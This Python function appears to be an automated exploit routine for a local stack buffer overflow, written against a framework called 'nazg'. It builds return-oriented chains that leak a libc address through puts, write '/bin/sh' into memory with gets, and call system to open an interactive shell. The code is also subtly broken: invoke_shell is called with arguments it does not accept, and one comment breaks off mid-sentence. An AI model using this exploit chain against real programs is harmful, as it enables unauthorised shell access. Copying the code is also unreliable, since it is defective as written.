def exploit_local_buffer_overflow(nazg, function):
    function = nazg.bind(function)
    nazg.navigate(function)
    
    # leak libc address and return to function
    def leak_libc(nazg, function):
        smrop = nazg.Smrop() # creates smrop tied to needed binary
        smrop.call("puts", nazg.binary.got("puts"))
        smrop.ret(function.enter)
        return smrop.resolve() # create byte string
    payload = leak_libc(nazg, function)
    buffer = function.find_local_buffer(writes_to=StackOffset(function.return_offset), min_length=len(payload))
    buffer.write(leak_libc(nazg, function))
    libc_address = nazg.read_address_line()
    nazg.resolve("libc", libc_address) # assign value to libc within nazg instance
    nazg.navigate(function.exit) # we're now in loopback
    
    # receive location to write to
    def write_command(nazg, function):
        smrop = nazg.Smrop()
        # This is the one part we can't currently do since it relies on libc
        # values being correct, which they won't be. Without implementing proper
        # aslr support in angr, our best option is to reinitialize the 
        # StackBufferOverflow currently uses 
        smrop.call("gets", smrop.libc.symbols["gets"], nazg.binary.bss() + 0x200)
        smrop.ret(function.enter)
        return smrop.resolve()
    buffer.write(write_command(nazg, function))
    nazg.navigate(function.exit)
    nazg.sendline(b"/bin/sh")

    # invoke the shell
    def invoke_shell():
        smrop = nazg.Smrop()
        smrop.call("system", nazg.binary.bss() + 0x200)
        return smrop.resolve()
    buffer.write(invoke_shell(nazg, function))

    nazg.interactive()